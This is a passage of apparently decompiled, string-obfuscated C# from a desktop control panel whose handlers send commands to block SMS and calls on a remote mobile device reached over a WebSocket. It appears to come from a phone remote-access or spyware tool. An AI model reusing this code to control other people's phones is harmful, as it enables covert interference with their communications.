		}
		waitload = false;
	}

	private void Combodats_sms_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!waitload)
		{
			string value = Combodats_sms.Text;
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._1F743153, BTConst.blkercom);
			dictionary.Add(EXGuarder._0C321472, EXGuarder._6B44666F);
			dictionary.Add(EXGuarder._53615852, value);
			dictionary.Add(EXGuarder._1505633C, EXGuarder._270E612F);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}

	private void Combodats_calls_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!waitload)
		{
			string value = Combodats_calls.Text;
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._3F105174, BTConst.blkercom);
			dictionary.Add(EXGuarder._6B264A72, EXGuarder._6D3B3325);
			dictionary.Add(EXGuarder._403F2938, value);
			dictionary.Add(EXGuarder._2D45720E, EXGuarder._0A202417);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}

	private void activecalls_MouseClick(object sender, MouseEventArgs e)
	{
		if (activecalls.Enabled && activecalls.Checked)
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._60076172, BTConst.blkercom);
			dictionary.Add(EXGuarder._62197136, EXGuarder._75046B07);
			dictionary.Add(EXGuarder._66484F4F, EXGuarder._60621F1A);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}

	private void activesms_MouseClick(object sender, MouseEventArgs e)
	{
		if (activecalls.Enabled && activecalls.Checked)
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._66054367, BTConst.blkercom);
			dictionary.Add(EXGuarder._69492644, EXGuarder._35721E57);
			dictionary.Add(EXGuarder._76201E13, EXGuarder._2B6A043E);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}
}
